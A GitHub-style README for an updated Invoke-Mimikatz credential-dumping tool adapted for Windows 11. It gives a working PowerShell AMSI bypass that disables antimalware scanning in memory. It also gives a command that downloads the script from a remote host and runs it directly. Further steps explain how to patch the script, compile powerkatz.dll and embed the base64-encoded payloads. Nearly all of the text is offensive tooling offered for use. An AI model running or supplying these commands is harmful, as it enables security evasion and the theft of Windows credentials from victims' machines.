# Invoke-Mimikatz for Windows 11
Updated version of Invoke-Mimikatz that runs on Windows 11.

## How to use

1. Bypass AMSI: 
```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
```

2. Load Invoke-Mimikatz:
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tartofour/Invoke-Mimikatz/main/Invoke-Mimikatz.ps1')
```

3. Run Invoke-Mimikatz: `Invoke-Mimikatz`

## How to update the script

1. Download Invoke-Mimikatz.ps1 from the PowerShellMafia repo (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1).
2. Change the following line:
`$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')` to `$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);`

3. Clone the mimikatz repo from ebalo55 (https://github.com/ebalo55/mimikatz/tree/main).
4. Open the project in VSCode.
5. Select "Second_Release_PowerShell" and build the project.
6. Base64 encode `Win32/powerkatz.dll` and `x64/powerkatz.dll`.
7. In `Invoke-Mimikatz.ps1`, replace the content of the `PEBytes64` and `PEBytes32` variables with base64 encoded payloads.

## References
- https://github.com/mitre/caldera/issues/38
- https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/ 

